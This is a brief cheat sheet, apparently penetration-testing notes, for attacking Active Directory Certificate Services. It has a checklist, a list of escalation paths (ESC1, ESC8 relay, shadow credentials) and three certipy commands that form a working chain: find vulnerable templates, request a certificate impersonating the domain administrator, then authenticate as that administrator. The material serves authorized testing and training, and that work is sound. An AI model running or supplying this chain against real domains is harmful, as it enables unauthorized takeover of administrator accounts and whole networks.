# AD CS

**Ports:** 80/443, 389/636

**Quick Checklist**
- [ ] Enterprise CA present?
- [ ] Vulnerable templates (ESC1–ESC8)?
- [ ] Web enrollment open?

```bash
certipy find -u user@DOMAIN -p 'pass' -dc-ip DC_IP -vulnerable -text -output adcs
certipy req -u user@DOMAIN -p 'pass' -ca CA-NAME -template VulnerableTemplate -upn administrator@DOMAIN -dc-ip DC_IP
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**Common ESC Paths**
- **ESC1**: User-supplied SAN + Client Authentication
- **ESC8**: NTLM relay to HTTP web enrollment
- **Shadow Credentials**: Write `msDS-KeyCredentialLink`
